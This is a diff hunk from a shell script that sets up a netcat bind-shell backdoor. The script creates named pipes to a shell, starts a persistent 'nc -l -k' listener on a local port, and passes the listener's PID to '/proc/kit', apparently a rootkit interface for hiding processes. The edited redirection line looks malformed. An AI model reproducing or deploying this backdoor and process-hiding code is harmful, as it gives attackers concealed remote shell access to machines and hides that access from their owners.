@@ -13,7 +13,7 @@ mkfifo fromBash
 mkfifo toBash
 mkfifo fromBashStderr
 
-nc -l -k "$localPort" < fromBash <2 fromBashStderr> toBash &
+nc -l -k "$localPort" < fromBash < fromBashStderr> toBash &
 backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
